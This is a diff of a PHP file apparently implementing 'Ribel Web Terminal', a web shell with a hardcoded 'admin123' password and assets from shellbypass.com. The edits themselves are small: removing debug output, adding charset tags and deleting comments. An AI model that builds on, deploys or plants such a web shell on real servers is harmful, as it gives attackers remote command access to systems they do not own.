@@ -1,7 +1,5 @@
 <?php
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+header('Content-Type: text/html; charset=UTF-8');
 $PASSWORD = "admin123";  // default Password
 session_start();
 define('SCRIPT_DIR', __DIR__);
@@ -534,6 +532,7 @@ function showLoginScreen() {
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Ribel Web Terminal Login</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <link rel="icon" href="https://www.shellbypass.com/images/kurakura.ico" type="image/x-icon">
         <meta property="og:image" content="https://raw.shellbypass.com/og-image.png">
         <style>
@@ -717,6 +716,7 @@ function showTerminal() {
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Ribel Web Terminal</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <link rel="icon" href="https://www.shellbypass.com/images/kurakura.ico" type="image/x-icon">
         <meta property="og:image" content="https://raw.shellbypass.com/og-image.png">
         <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
@@ -1108,8 +1108,7 @@ function showTerminal() {
                 const formData = new FormData();
                 formData.append('api', '1');
                 formData.append('action', 'methods');
-                
-                // HAPUS duplikasi fetch - hanya SATU fetch
+
                 const response = await fetch('?', {
                     method: 'POST',
                     body: formData
@@ -1150,8 +1149,7 @@ function showTerminal() {
                 const formData = new FormData();
                 formData.append('api', '1');
                 formData.append('action', 'info');
-                
-                // HAPUS duplikasi fetch - hanya SATU fetch
+
                 const response = await fetch('?', {
                     method: 'POST',
                     body: formData
